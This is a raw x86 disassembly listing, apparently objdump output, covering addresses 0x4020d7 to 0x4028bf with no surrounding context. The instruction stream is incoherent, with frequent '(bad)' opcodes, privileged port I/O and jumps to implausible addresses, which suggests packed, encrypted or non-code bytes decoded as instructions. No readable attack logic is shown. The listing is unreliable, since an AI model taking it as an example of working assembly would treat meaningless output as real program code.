  4020d7:	mov    bh,0xe3
  4020d9:	mov    al,ds:0x1edd2335
  4020de:	sub    BYTE PTR [edi+0x437c63b7],dh
  4020e4:	retf   0xaf1f
  4020e7:	in     al,dx
  4020e8:	push   edi
  4020e9:	mov    DWORD PTR [ebp-0x20],ecx
  4020ec:	sbb    al,0x24
  4020ee:	pop    ss
  4020ef:	shr    DWORD PTR ds:0x58ed720f,cl
  4020f5:	adc    ch,0x7a
  4020f8:	arpl   WORD PTR [edx],sp
  4020fa:	sbb    dl,cl
  4020fc:	or     DWORD PTR [esi-0x741a4f48],ecx
  402102:	cmp    edx,DWORD PTR [ebx+0x56]
  402105:	cdq    
  402106:	dec    edi
  402107:	cmp    al,0x1d
  402109:	bound  ebp,QWORD PTR [edi-0x2a091ed6]
  40210f:	xor    al,0x44
  402111:	cmp    BYTE PTR [ebp+eiz*4-0x19bdce9b],al
  402118:	pop    esi
  402119:	sbb    al,0x4f
  40211b:	xor    al,BYTE PTR [eax]
  40211d:	xchg   edi,eax
  40211e:	scas   al,BYTE PTR es:[edi]
  40211f:	inc    ebx
  402120:	xchg   BYTE PTR [ebx+0x2add7588],ch
  402126:	dec    ebp
  402127:	out    dx,al
  402128:	aaa    
  402129:	stc    
  40212a:	imul   BYTE PTR [ebx-0x6c]
  40212d:	xacquire xchg BYTE PTR [esi-0x7b46f160],bh
  402134:	stos   BYTE PTR es:[edi],al
  402135:	add    dl,BYTE PTR [ecx-0x2b]
  402138:	dec    edi
  402139:	cmp    eax,0x9118b904
  40213e:	(bad)  
  40213f:	xchg   esi,eax
  402140:	jge    0x402150
  402142:	pushf  
  402143:	scas   eax,DWORD PTR es:[edi]
  402144:	cs aaa 
  402146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402147:	inc    eax
  402148:	adc    DWORD PTR [esi+esi*1],ebp
  40214b:	(bad)  
  40214d:	pop    edx
  40214e:	pop    edi
  40214f:	push   esp
  402150:	adc    ebx,ecx
  402152:	inc    esp
  402153:	ffreep st(0)
  402155:	or     al,0x2f
  402157:	jne    0x4021b6
  402159:	jne    0x402134
  40215b:	dec    ebp
  40215c:	ja     0x4020e0
  40215e:	xor    al,0xdd
  402160:	lahf   
  402161:	icebp  
  402162:	es pop ds
  402164:	(bad)  
  402166:	sub    edx,DWORD PTR [esi]
  402168:	(bad)  
  402169:	loope  0x4021d2
  40216b:	adc    ecx,DWORD PTR [edx+esi*4-0x21]
  40216f:	sbb    ecx,eax
  402171:	cwde   
  402172:	mov    ch,BYTE PTR ds:0x89d6bf18
  402178:	pop    ds
  402179:	(bad)  
  40217a:	jnp    0x402102
  40217c:	test   ecx,edi
  40217e:	dec    eax
  40217f:	mov    esp,0x5b4145a9
  402184:	sbb    eax,0xfb1cef22
  402189:	mov    ds:0x65b0e7a8,eax
  40218e:	daa    
  40218f:	push   esi
  402190:	dec    ebx
  402191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402192:	pop    esi
  402193:	dec    ebp
  402194:	mov    dl,0x85
  402196:	in     al,0xb9
  402198:	shr    DWORD PTR [edi+edi*1],0x30
  40219c:	and    eax,0x97c908d9
  4021a1:	jo     0x402171
  4021a3:	mov    ebp,esi
  4021a5:	mov    al,0xc0
  4021a7:	or     BYTE PTR [edx+edi*4-0x1cb5506e],bh
  4021ae:	mov    esp,0xfa2dcc71
  4021b3:	mov    ebx,0xd00761e3
  4021b8:	ss in  eax,0x13
  4021bb:	aam    0x76
  4021bd:	jg     0x4021ad
  4021bf:	test   edx,ebx
  4021c1:	not    BYTE PTR [edx+eiz*4-0x225a3b30]
  4021c8:	mov    edi,0xa1ee162f
  4021cd:	sar    ah,1
  4021cf:	cdq    
  4021d0:	out    0x45,al
  4021d2:	xchg   edx,eax
  4021d3:	adc    eax,0x4e
  4021d6:	cmp    al,0x63
  4021d8:	inc    esp
  4021d9:	daa    
  4021da:	mov    ecx,0x1420cbd3
  4021df:	xlat   BYTE PTR ds:[ebx]
  4021e0:	pop    ebp
  4021e1:	sbb    dh,BYTE PTR [ebx+0x4e361012]
  4021e7:	sub    dh,BYTE PTR [esi-0x3c2f53e1]
  4021ed:	inc    esi
  4021ee:	push   edx
  4021ef:	outs   dx,BYTE PTR ds:[esi]
  4021f0:	cmp    eax,0x20f47753
  4021f5:	xor    al,0x6
  4021f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021f8:	and    esi,eax
  4021fa:	add    DWORD PTR [edi+0x56],esp
  4021fd:	sub    al,0xd6
  4021ff:	xor    edx,edx
  402201:	dec    ebp
  402202:	rcr    DWORD PTR [ebx],cl
  402204:	lahf   
  402205:	je     0x4021cb
  402207:	cmp    dh,0x6f
  40220a:	mov    cl,BYTE PTR [esi-0x624ca3e1]
  402210:	(bad)  
  402211:	in     eax,dx
  402212:	jle    0x4021d5
  402214:	pushf  
  402215:	or     eax,0x5d71769a
  40221a:	and    al,bl
  40221c:	mov    BYTE PTR [edx*2+0x237bcbaa],cl
  402223:	fwait
  402224:	sbb    DWORD PTR ds:0x6e7471df,0xcbd9c32d
  40222e:	icebp  
  40222f:	bound  edi,QWORD PTR [esi]
  402231:	(bad)  
  402232:	loopne 0x4021f6
  402234:	mov    ds:0x7a7f5561,eax
  402239:	push   es
  40223a:	cmp    eax,0xdba7ecfe
  40223f:	or     eax,0xac1c497e
  402244:	fld    TBYTE PTR ds:0x5885ef73
  40224a:	cs loop 0x402295
  40224d:	push   esp
  40224e:	or     BYTE PTR [eax],ah
  402250:	int    0xbb
  402252:	faddp  st(2),st
  402254:	and    BYTE PTR [ebx],dl
  402256:	cmp    al,0x7c
  402258:	(bad)  
  402259:	jmp    0x6a1dc334
  40225e:	fwait
  40225f:	push   ebp
  402260:	add    bl,BYTE PTR [ecx]
  402262:	fdiv   DWORD PTR [eax-0x797b732e]
  402268:	mov    dh,0xe5
  40226a:	xchg   ebx,eax
  40226b:	jns    0x402255
  40226d:	xchg   edx,eax
  40226e:	jl     0x402290
  402270:	rcr    BYTE PTR [esp+eax*2+0x7f24a6c0],0x36
  402278:	inc    ebp
  402279:	mov    ds:0x65295e81,al
  40227e:	push   0x15376961
  402283:	sub    eax,0x897de407
  402288:	dec    eax
  402289:	test   DWORD PTR [esi],esp
  40228b:	push   esp
  40228c:	je     0x402231
  40228e:	adc    BYTE PTR [ecx+edi*1],cl
  402291:	jnp    0x40229d
  402293:	aam    0xbf
  402295:	mov    ecx,ebx
  402297:	cmp    eax,0xabb8ef91
  40229c:	inc    edi
  40229d:	hlt    
  40229e:	lds    edi,FWORD PTR [ecx-0x7499627b]
  4022a4:	xor    eax,0x3d989199
  4022a9:	push   0xffffffaa
  4022ab:	ds dec edx
  4022ad:	jmp    0x70eb1a98
  4022b2:	inc    edx
  4022b3:	push   ebx
  4022b4:	jno    0x402282
  4022b6:	inc    edi
  4022b7:	aam    0xe6
  4022b9:	imul   esp,DWORD PTR [edx+eiz*4+0x29],0x114b83f8
  4022c1:	jmp    0x40227e
  4022c3:	fwait
  4022c4:	(bad)  
  4022c5:	adc    al,0x97
  4022c7:	and    DWORD PTR ds:0x1e9079b2,0x6b734308
  4022d1:	xor    eax,0x4201be86
  4022d6:	jno    0x4022ce
  4022d8:	lock push es
  4022da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022db:	jl     0x40233e
  4022dd:	ins    DWORD PTR es:[edi],dx
  4022de:	sbb    eax,0x619502ad
  4022e3:	jo     0x402300
  4022e5:	inc    ecx
  4022e6:	push   es
  4022e7:	push   0xffffffe8
  4022e9:	scas   eax,DWORD PTR es:[edi]
  4022ea:	ror    BYTE PTR [ecx+0x51],cl
  4022ed:	adc    esi,DWORD PTR [ebp-0x57]
  4022f0:	sub    dh,BYTE PTR cs:[ecx-0x487b4eed]
  4022f7:	jmp    0x4022fb
  4022f9:	jge    0x40235a
  4022fb:	pop    ss
  4022fc:	scas   al,BYTE PTR es:[edi]
  4022fd:	(bad)  
  4022ff:	xor    edx,DWORD PTR [esi]
  402301:	pop    esi
  402302:	(bad)  
  402303:	in     al,dx
  402304:	jo     0x40232f
  402306:	mov    ch,0xea
  402308:	ret    0x23c5
  40230b:	aaa    
  40230c:	dec    eax
  40230d:	xor    al,0x29
  40230f:	cld    
  402310:	test   al,0xc3
  402312:	ret    0xf4cf
  402315:	das    
  402316:	inc    edx
  402317:	mov    ecx,0xca3efb4d
  40231c:	add    DWORD PTR [edi+0x3],ecx
  40231f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402320:	add    ch,BYTE PTR [edx-0xe]
  402323:	sub    eax,0xb0f3f105
  402328:	out    0x16,al
  40232a:	test   al,0x6f
  40232c:	and    al,0xb4
  40232e:	aam    0xfc
  402330:	test   al,0x4b
  402332:	mov    bh,0xd9
  402334:	mov    esp,0x7fad62c3
  402339:	and    al,0xab
  40233b:	xchg   edx,esi
  40233d:	add    eax,0x40271943
  402342:	and    dh,BYTE PTR [ecx+esi*4+0x8466831]
  402349:	inc    edi
  40234a:	imul   esi,DWORD PTR ds:0x508b3ba6,0xffffff82
  402351:	mov    bl,0xc
  402353:	mov    esi,0x711d5baf
  402358:	mov    eax,0x92f8fe3d
  40235d:	mov    dl,0x45
  40235f:	sbb    eax,0x44dac658
  402364:	popf   
  402365:	stc    
  402366:	push   0x6b
  402368:	pop    edx
  402369:	lods   eax,DWORD PTR ds:[esi]
  40236a:	push   ebp
  40236b:	push   edx
  40236c:	sbb    eax,0x997ee896
  402371:	add    cl,ah
  402373:	or     eax,0xb1c204bc
  402378:	loop   0x4023c0
  40237a:	ins    DWORD PTR es:[edi],dx
  40237b:	mov    ebp,0x789c3ad5
  402380:	dec    esi
  402381:	inc    ebx
  402382:	mov    ds:0x32dfe52a,al
  402387:	retf   0x4977
  40238a:	inc    eax
  40238b:	fwait
  40238c:	retf   
  40238d:	adc    DWORD PTR [esi],0xfffffff5
  402390:	icebp  
  402391:	clc    
  402392:	push   esi
  402393:	idiv   BYTE PTR [ebx-0x75875035]
  402399:	mov    edx,0xeca9e566
  40239e:	pop    ecx
  40239f:	std    
  4023a0:	loop   0x40237f
  4023a2:	leave  
  4023a3:	repnz add al,ch
  4023a6:	cmp    DWORD PTR [ebx+0x2b67b2b4],esi
  4023ac:	das    
  4023ad:	dec    ecx
  4023ae:	jmp    0x53b118b9
  4023b3:	call   DWORD PTR [esi+ebp*8-0x71]
  4023b7:	ret    
  4023b8:	push   ebp
  4023b9:	(bad)  
  4023ba:	fldenv [eax-0x50]
  4023bd:	dec    ebx
  4023be:	(bad)  
  4023bf:	cmp    bl,ah
  4023c1:	mov    al,0xef
  4023c3:	arpl   bx,di
  4023c5:	or     dl,BYTE PTR ss:[ebp+0x16478ec7]
  4023cc:	push   ds
  4023cd:	xchg   edi,eax
  4023ce:	jnp    0x402399
  4023d0:	fs mov cl,0xd
  4023d3:	in     eax,dx
  4023d4:	jl     0x40241a
  4023d6:	out    0x5c,eax
  4023d8:	aas    
  4023d9:	inc    eax
  4023da:	pop    edx
  4023db:	add    eax,0xb3e8c87f
  4023e0:	xor    dh,bl
  4023e2:	gs pusha 
  4023e4:	sub    al,0x9d
  4023e6:	and    eax,DWORD PTR [edx]
  4023e8:	add    bh,BYTE PTR [ebx]
  4023ea:	push   ebx
  4023eb:	mov    eax,ds:0x7588cc3c
  4023f0:	pusha  
  4023f1:	out    dx,eax
  4023f2:	out    dx,eax
  4023f3:	add    BYTE PTR [eax+0x5983b],al
  4023f9:	xchg   BYTE PTR [esp+eax*8],ah
  4023fc:	dec    ebx
  4023fd:	je     0x40247d
  4023ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402400:	sbb    eax,DWORD PTR ds:0x3fdc3f15
  402406:	ret    0x32cc
  402409:	loopne 0x402447
  40240b:	sub    BYTE PTR [eax],bh
  40240d:	xor    DWORD PTR [ebx+0x57],ecx
  402410:	add    al,0xde
  402412:	lahf   
  402413:	loope  0x40241b
  402415:	mov    bh,0x4d
  402417:	push   es
  402418:	enter  0x65c6,0x21
  40241c:	test   BYTE PTR [edi+esi*8+0x7dda0a2c],al
  402423:	mov    eax,0xe42981bc
  402428:	dec    ebx
  402429:	jmp    0x89251956
  40242e:	pop    ds
  40242f:	jmp    0xcde7c3f3
  402434:	dec    esp
  402435:	cmp    eax,0x4688e392
  40243a:	dec    edx
  40243b:	fyl2xp1 
  40243d:	lods   al,BYTE PTR ds:[esi]
  40243e:	inc    esi
  40243f:	dec    ebp
  402440:	mov    dl,0xe1
  402442:	js     0x402482
  402444:	aas    
  402445:	adc    al,0x1d
  402447:	xchg   esp,eax
  402448:	ins    DWORD PTR es:[edi],dx
  402449:	jg     0x4024ab
  40244b:	adc    eax,0xafaccae7
  402450:	mov    cl,0x70
  402452:	adc    bh,cl
  402454:	pop    ebx
  402455:	add    DWORD PTR [esi-0x2b],ebp
  402458:	and    DWORD PTR [eax+0x8c71902],esi
  40245e:	and    bh,dh
  402460:	jne    0x40249d
  402462:	js     0x402476
  402464:	xor    BYTE PTR [ebx-0x15],ch
  402467:	out    dx,al
  402468:	leave  
  402469:	or     BYTE PTR [ebp-0x18],0xd4
  40246d:	(bad)  [ecx-0xa3b3724]
  402473:	jo     0x40247c
  402475:	aad    0x31
  402477:	adc    bh,cl
  402479:	or     al,0xe6
  40247b:	jge    0x4024de
  40247d:	loope  0x402449
  40247f:	mov    ebp,0xd331bd45
  402484:	mov    dl,0xad
  402486:	mov    BYTE PTR [ebx],ch
  402488:	nop
  402489:	inc    ecx
  40248a:	pop    es
  40248b:	mov    dh,0x13
  40248d:	mov    ds:0xaf051562,al
  402492:	stos   BYTE PTR es:[edi],al
  402493:	in     eax,dx
  402494:	adc    BYTE PTR [edi-0x70d9b560],dl
  40249a:	adc    al,0x3f
  40249c:	jb     0x40251d
  40249e:	jl     0x402493
  4024a0:	pop    es
  4024a1:	out    0x44,eax
  4024a3:	mov    ds:0xead191a2,al
  4024a8:	out    dx,al
  4024a9:	sar    DWORD PTR [esi+0x60],cl
  4024ac:	in     eax,dx
  4024ad:	es iret 
  4024af:	dec    ecx
  4024b0:	cmc    
  4024b1:	into   
  4024b2:	das    
  4024b3:	cld    
  4024b4:	or     eax,0x743f6685
  4024b9:	jo     0x4024ce
  4024bb:	jge    0x402531
  4024bd:	loop   0x402495
  4024bf:	pop    ss
  4024c0:	sub    dl,dh
  4024c2:	pop    esp
  4024c3:	push   eax
  4024c4:	or     eax,0x593a88db
  4024c9:	aad    0x5a
  4024cb:	xchg   esp,eax
  4024cc:	(bad)  
  4024cd:	cmp    eax,DWORD PTR [ecx-0xd5ccc24]
  4024d3:	scas   al,BYTE PTR es:[edi]
  4024d4:	outs   dx,BYTE PTR ds:[esi]
  4024d5:	jp     0x4024a2
  4024d7:	adc    BYTE PTR ds:0x4bc3e7f2,0x9
  4024de:	push   ss
  4024df:	stos   BYTE PTR es:[edi],al
  4024e0:	sub    esi,DWORD PTR [eax+edx*4-0x6a]
  4024e4:	fsubr  DWORD PTR [ebp-0x5bd7a1c5]
  4024ea:	dec    esi
  4024eb:	(bad)  
  4024ec:	cli    
  4024ed:	xor    edi,DWORD PTR [esi-0x7f64cfd7]
  4024f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024f4:	les    esp,FWORD PTR [edx+0x3876bbb6]
  4024fa:	or     eax,0xec0b4888
  4024ff:	lods   eax,DWORD PTR fs:[esi]
  402501:	fisttp WORD PTR [edi+0x20]
  402504:	out    0x8f,eax
  402506:	xchg   ecx,eax
  402507:	mov    esp,0x45da4df0
  40250c:	adc    al,0xb1
  40250e:	daa    
  40250f:	out    0xf,al
  402511:	sbb    eax,0x3c6777f1
  402516:	lock clc 
  402518:	out    0xdc,al
  40251a:	push   esi
  40251b:	nop
  40251c:	ja     0x402532
  40251e:	sbb    eax,0x9fac14d9
  402523:	sahf   
  402524:	mov    edx,0xaac99114
  402529:	retf   
  40252a:	div    DWORD PTR [eax+0xc36c3e2]
  402530:	pop    edi
  402531:	(bad)  
  402532:	inc    BYTE PTR [esi-0x37]
  402535:	int3   
  402536:	mov    eax,ecx
  402538:	pop    esp
  402539:	push   0x635643cb
  40253e:	dec    ecx
  40253f:	and    esi,esi
  402541:	cmp    ah,dl
  402543:	push   0x10
  402545:	xor    al,0x9b
  402547:	and    eax,0x62c4d548
  40254c:	aas    
  40254d:	push   edx
  40254e:	les    edi,FWORD PTR [ebx+edx*4-0x50e1a06c]
  402555:	mov    dl,bl
  402557:	add    al,0xde
  402559:	rcl    BYTE PTR [eax+0x54adc557],0x64
  402560:	mov    esp,0xf7c2c2d8
  402565:	imul   dl
  402567:	arpl   cx,bx
  402569:	inc    edx
  40256a:	inc    dh
  40256c:	shl    DWORD PTR [edx+0x18ce9e65],cl
  402572:	cmp    al,BYTE PTR [esi+0x48]
  402575:	out    dx,al
  402576:	pop    ebx
  402577:	inc    ebp
  402578:	ds push edi
  40257a:	(bad)  
  40257b:	pusha  
  40257c:	mov    gs,WORD PTR [esi+0x1a]
  40257f:	or     al,ah
  402581:	loope  0x4025b8
  402583:	or     DWORD PTR [edx+0x84459e7],0x53
  40258a:	cmc    
  40258b:	mov    ch,0xf2
  40258d:	cli    
  40258e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40258f:	cmp    eax,0xc73d00a9
  402594:	rcr    BYTE PTR [esi],0x80
  402597:	imul   ecx,DWORD PTR [ecx+0x4209e917],0x2a1d5f8f
  4025a1:	leave  
  4025a2:	xlat   BYTE PTR ds:[ebx]
  4025a3:	scas   eax,DWORD PTR es:[edi]
  4025a4:	dec    eax
  4025a5:	fiadd  DWORD PTR [ecx+ebx*4-0x21]
  4025a9:	sbb    esp,0xffffff97
  4025ac:	ret    0xda0a
  4025af:	pop    edi
  4025b0:	hlt    
  4025b1:	(bad)  [edx+0x461dcd72]
  4025b7:	jmp    0x9d0:0x1cdb15fc
  4025be:	mov    al,0xd8
  4025c0:	outs   dx,DWORD PTR ds:[esi]
  4025c1:	jne    0x402586
  4025c3:	mov    al,0xf1
  4025c5:	js     0x4025ae
  4025c7:	xor    DWORD PTR [esi],esi
  4025c9:	sbb    dh,ch
  4025cb:	and    al,0x1
  4025cd:	outs   dx,DWORD PTR ds:[esi]
  4025ce:	neg    DWORD PTR [edi+eiz*4]
  4025d1:	adc    edx,DWORD PTR ds:0xc98c77bf
  4025d7:	cmp    eax,DWORD PTR [esi]
  4025d9:	add    DWORD PTR [esi-0x6b],0x99bc4a5f
  4025e0:	push   edi
  4025e1:	mov    ebp,0xbbe1855
  4025e6:	adc    ebx,edx
  4025e8:	into   
  4025e9:	mov    esp,0xa970aeb6
  4025ee:	add    ah,BYTE PTR [eax]
  4025f0:	push   ss
  4025f1:	mov    es,WORD PTR [edi+0x6]
  4025f4:	push   ds
  4025f5:	cmp    eax,0xbb03951c
  4025fa:	es dec ebp
  4025fc:	xor    ah,BYTE PTR [ebx+0x4d34b944]
  402602:	jmp    0x628b:0xba1bbb78
  402609:	dec    edi
  40260a:	and    BYTE PTR [edi-0x10712d4e],dh
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	add    bh,BYTE PTR [edi+0x1067296c]
  402617:	je     0x4025f8
  402619:	mov    al,0xc9
  40261b:	enter  0xe334,0x1a
  40261f:	in     eax,dx
  402620:	scas   al,BYTE PTR es:[edi]
  402621:	ror    BYTE PTR [ebx-0x79968158],1
  402627:	push   0x89b22f93
  40262c:	daa    
  40262d:	int3   
  40262e:	in     al,dx
  40262f:	lods   al,BYTE PTR ds:[esi]
  402630:	push   ecx
  402631:	aad    0xe5
  402633:	dec    edi
  402634:	jmp    0x715a2dae
  402639:	mov    bl,BYTE PTR [ecx+0x15611349]
  40263f:	jbe    0x402626
  402641:	sbb    DWORD PTR [ecx-0x769ebe38],0x6388021
  40264b:	clc    
  40264c:	inc    ebp
  40264d:	push   ebx
  40264e:	in     eax,dx
  40264f:	stos   DWORD PTR es:[edi],eax
  402650:	xchg   edi,eax
  402651:	push   esi
  402652:	popf   
  402653:	sub    al,0x5b
  402655:	(bad)  [eax+0xc043f28]
  40265b:	ins    DWORD PTR es:[edi],dx
  40265c:	push   ebx
  40265d:	mov    esp,0x782db1fd
  402662:	hlt    
  402663:	push   ecx
  402664:	nop
  402665:	in     eax,dx
  402666:	jno    0x402651
  402668:	icebp  
  402669:	push   ss
  40266a:	cmp    BYTE PTR [edx+eax*4+0x27724d4e],0x1d
  402672:	adc    dl,BYTE PTR [edi+eiz*2-0x30ab60b8]
  402679:	dec    edi
  40267a:	enter  0x68f5,0x72
  40267e:	jbe    0x4026a5
  402680:	daa    
  402681:	scas   eax,DWORD PTR es:[edi]
  402682:	mov    dl,0x2b
  402684:	fadd   DWORD PTR [esi]
  402686:	jae    0x4026ec
  402688:	int3   
  402689:	sub    al,0x91
  40268b:	xchg   BYTE PTR [ebx-0x15],cl
  40268e:	fimul  DWORD PTR [esi+0x1f]
  402691:	fwait
  402692:	or     dl,BYTE PTR [ebx-0x52]
  402695:	in     eax,dx
  402696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402697:	jmp    0x402652
  402699:	xchg   BYTE PTR [ecx],dh
  40269b:	in     al,dx
  40269c:	cmp    bl,dl
  40269e:	mov    cl,0xc9
  4026a0:	jns    0x40271e
  4026a2:	and    BYTE PTR [esi+edx*2+0x47b9d5be],ah
  4026a9:	cwde   
  4026aa:	pop    esi
  4026ab:	pop    ebx
  4026ac:	cli    
  4026ad:	aaa    
  4026ae:	sub    al,0x50
  4026b0:	(bad)  [eax]
  4026b2:	pop    ecx
  4026b3:	daa    
  4026b4:	ja     0x402733
  4026b6:	mov    DWORD PTR [edx+0x5a65b317],0x30e8af57
  4026c0:	es and eax,0x48582fa7
  4026c6:	mov    edi,DWORD PTR [eax]
  4026c8:	inc    esp
  4026c9:	(bad)  
  4026ca:	mov    ds:0xaa77ca40,eax
  4026cf:	ins    DWORD PTR es:[edi],dx
  4026d0:	idiv   BYTE PTR [eax-0x33376cb1]
  4026d6:	sub    BYTE PTR [edx+0x745ebea7],cl
  4026dc:	lea    ecx,[edi]
  4026de:	call   0x5424:0x4010dfb8
  4026e5:	hlt    
  4026e6:	push   ecx
  4026e7:	popa   
  4026e8:	popf   
  4026e9:	mov    ecx,0x12ee494d
  4026ee:	xlat   BYTE PTR ds:[ebx]
  4026ef:	push   0x321b9183
  4026f4:	sub    ebp,DWORD PTR [ebx]
  4026f6:	fistp  QWORD PTR [edx+0x7d]
  4026f9:	pop    edx
  4026fa:	sbb    BYTE PTR [esi+0x27],bl
  4026fd:	fild   WORD PTR [ecx+0x29eeea3a]
  402703:	fnstsw WORD PTR [edx-0x33]
  402706:	sub    eax,0x74d8e7f0
  40270b:	scas   al,BYTE PTR es:[edi]
  40270c:	test   DWORD PTR [edx-0x2a26aca1],ebp
  402712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402713:	inc    ecx
  402714:	inc    ebp
  402715:	push   ecx
  402716:	jle    0x402731
  402718:	lahf   
  402719:	dec    ecx
  40271a:	inc    edi
  40271b:	jp     0x402718
  40271d:	hlt    
  40271e:	adc    eax,0x6b4d7a7f
  402723:	ds scas eax,DWORD PTR es:[edi]
  402725:	add    edi,DWORD PTR [edi+0x44d4f58f]
  40272b:	enter  0xb2cc,0xa9
  40272f:	ds aam 0x91
  402732:	(bad)  
  402733:	dec    esi
  402734:	hlt    
  402735:	test   DWORD PTR [ecx-0x42f732ec],edx
  40273b:	adc    ch,al
  40273d:	xchg   DWORD PTR [ecx],esp
  40273f:	mov    eax,ds:0xe9d74fd6
  402744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402745:	push   cs
  402746:	add    bl,BYTE PTR ds:0x2a9b9295
  40274c:	xchg   edi,eax
  40274d:	out    0x35,al
  40274f:	jo     0x402790
  402751:	xchg   esi,esi
  402753:	sbb    al,BYTE PTR [edi]
  402755:	data16 aam 0xbe
  402758:	jg     0x4027ab
  40275a:	pop    eax
  40275b:	push   ebx
  40275c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40275d:	(bad)  
  40275e:	sub    ch,ch
  402760:	sti    
  402761:	push   esi
  402762:	add    al,0x1f
  402764:	ja     0x4026ed
  402766:	fld    DWORD PTR [ebp-0x2686b1b8]
  40276c:	mov    edx,0x884d3ec0
  402771:	retf   0x34c8
  402774:	enter  0x4361,0x3d
  402778:	sub    eax,0xd78c7ed8
  40277d:	dec    edx
  40277e:	int3   
  40277f:	pop    edx
  402780:	int    0xf3
  402782:	enter  0x8af6,0x3f
  402786:	pushf  
  402787:	test   BYTE PTR [edx],bh
  402789:	sub    DWORD PTR [ecx+0x68517ecb],edx
  40278f:	dec    ebp
  402790:	inc    esp
  402791:	mov    BYTE PTR [esi+0x6b60943c],0x0
  402798:	daa    
  402799:	and    ecx,DWORD PTR gs:[ebx-0x6e]
  40279d:	fcmovnb st,st(5)
  40279f:	cmp    esi,edi
  4027a1:	push   ebx
  4027a2:	add    BYTE PTR [edi-0x65],cl
  4027a5:	(bad)  
  4027a6:	ja     0x402780
  4027a8:	cmc    
  4027a9:	int3   
  4027aa:	push   eax
  4027ab:	scas   eax,DWORD PTR es:[edi]
  4027ac:	and    eax,0xaa51648b
  4027b1:	ins    DWORD PTR es:[edi],dx
  4027b2:	in     al,0x66
  4027b4:	lods   al,BYTE PTR ds:[esi]
  4027b5:	(bad)  
  4027b7:	dec    eax
  4027b8:	in     eax,0xf6
  4027ba:	and    al,0xaa
  4027bc:	lods   al,BYTE PTR ds:[esi]
  4027bd:	xor    esp,DWORD PTR [ecx-0x4791e2de]
  4027c3:	push   es
  4027c4:	fstp   TBYTE PTR [edi-0x34da4a1b]
  4027ca:	add    BYTE PTR [ecx],bl
  4027cc:	fwait
  4027cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027ce:	icebp  
  4027cf:	jne    0x4027ec
  4027d1:	ins    BYTE PTR es:[edi],dx
  4027d2:	popa   
  4027d3:	cmp    DWORD PTR [ebp+ecx*2-0x1c7c5808],esp
  4027da:	dec    esi
  4027db:	icebp  
  4027dc:	add    ch,bh
  4027de:	das    
  4027df:	xor    BYTE PTR [eax+0x5],dl
  4027e2:	dec    ecx
  4027e3:	aaa    
  4027e4:	(bad)  
  4027e5:	mov    esp,0x18964f7a
  4027ea:	outs   dx,BYTE PTR ds:[esi]
  4027eb:	aaa    
  4027ec:	sub    al,0x5
  4027ee:	lahf   
  4027ef:	fwait
  4027f0:	retf   
  4027f1:	mov    al,0xc
  4027f3:	jl     0x402830
  4027f5:	push   ecx
  4027f6:	xchg   DWORD PTR [esp+esi*4-0x4945802a],ebp
  4027fd:	(bad)  
  4027fe:	pop    esp
  4027ff:	mov    al,ds:0xb7f989b4
  402804:	mov    ecx,0x495e4f08
  402809:	(bad)  ss:[esp+edx*8+0x36]
  40280e:	addr16 popfw 
  402811:	dec    BYTE PTR [edx]
  402813:	or     esi,ebp
  402815:	add    bh,0xd3
  402818:	daa    
  402819:	dec    edx
  40281a:	xchg   BYTE PTR [ebp+0x2d86f0f4],dh
  402820:	push   edx
  402821:	lds    ecx,FWORD PTR [edi]
  402823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402824:	mov    ch,0xbb
  402826:	push   ds
  402827:	out    0xec,eax
  402829:	inc    edi
  40282a:	mov    esi,0xda02baa
  40282f:	out    dx,al
  402830:	ins    BYTE PTR es:[edi],dx
  402831:	pusha  
  402832:	out    dx,eax
  402833:	or     eax,0xd618e6b3
  402838:	mov    al,ds:0x77bc01d
  40283d:	jg     0x4028bb
  40283f:	pop    ebx
  402840:	imul   eax,DWORD PTR [ebx],0xffffffb7
  402843:	frstor [eax+0x31fe6e58]
  402849:	idiv   ecx
  40284b:	mov    BYTE PTR [edi],bl
  40284d:	in     eax,dx
  40284e:	int    0xa2
  402850:	int3   
  402851:	nop
  402852:	retf   0x97a
  402855:	int    0xc
  402857:	fwait
  402858:	cmp    bh,al
  40285a:	fwait
  40285b:	cwde   
  40285c:	sahf   
  40285d:	sub    ecx,DWORD PTR [edi]
  40285f:	sub    dh,BYTE PTR [eax-0x38b1dff]
  402865:	mov    esp,0x388a630c
  40286a:	xchg   esi,eax
  40286b:	loop   0x402846
  40286d:	inc    edx
  40286e:	hlt    
  40286f:	mov    ah,0x96
  402871:	in     eax,dx
  402872:	xlat   BYTE PTR ds:[ebx]
  402873:	fmul   DWORD PTR [esi+0x1e]
  402876:	daa    
  402877:	aad    0xca
  402879:	xchg   ecx,edx
  40287b:	(bad)  
  40287c:	cmp    edi,esi
  40287e:	lods   eax,DWORD PTR ds:[esi]
  40287f:	mov    ds:0xb825ced3,eax
  402884:	mov    esp,0x9b4258e
  402889:	call   0xc9abada0
  40288e:	inc    edx
  40288f:	popa   
  402890:	pop    es
  402891:	inc    ecx
  402892:	jbe    0x402833
  402894:	push   ss
  402895:	scas   al,BYTE PTR es:[edi]
  402896:	outs   dx,BYTE PTR ds:[esi]
  402897:	ficomp WORD PTR [eax+edi*8]
  40289a:	sbb    eax,0xc7d19dac
  40289f:	jg     0x4028be
  4028a1:	jle    0x402870
  4028a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028a4:	jae    0x402843
  4028a6:	pop    esp
  4028a7:	push   esi
  4028a8:	cmp    BYTE PTR [esi+0x71],cl
  4028ab:	mov    eax,0x5de9974d
  4028b0:	in     al,0xe7
  4028b2:	test   DWORD PTR [esi],ebx
  4028b4:	push   eax
  4028b5:	push   eax
  4028b6:	cmc    
  4028b7:	mov    eax,0x26033c13
  4028bc:	push   ecx
  4028bd:	mov    bh,0x1d
  4028bf:	outs   dx,DWORD PTR ds:[esi]
